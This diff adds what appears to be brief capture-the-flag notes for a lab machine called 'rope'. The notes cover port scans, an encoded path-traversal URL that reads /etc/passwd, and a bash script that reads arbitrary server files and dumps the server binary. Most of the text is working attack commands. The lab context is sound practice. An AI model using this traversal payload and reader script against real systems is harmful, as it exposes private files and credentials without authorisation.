@@ -1,0 +1,36 @@
+This is a buffer overflow machine.
+
+Enumeration
+
+nmap : nmap -sC -sV -oA rope.txt 10.10.10.148  
+Only two ports open. Port 22 and 9999
+
+Deeper enumeration
+
+masscan -p1-65535,U:1-65535 10.10.10.148 --rate=700
+
+
+Directory Traversal
+http://10.10.10.148:9999/..%2f..%2f..%2fetc%2fpasswd
+
+A bash script to read files and directories:
+
+#!/bin/bash
+
+HOST=10.10.10.148
+PORT=9999
+PAYLOAD="${1//\/%2f/}"
+
+OUT=$(curl -s \
+           "http://$HOST:$PORT/..%2f..$PAYLOAD")
+
+if grep -E '^<' <<<"$OUT" &>/dev/null; then
+  echo $OUT \
+  | html2text
+else
+  echo "$OUT"
+fi
+
+Get the server that is running here:
+./read.sh /proc/self/exe > httpserver
+
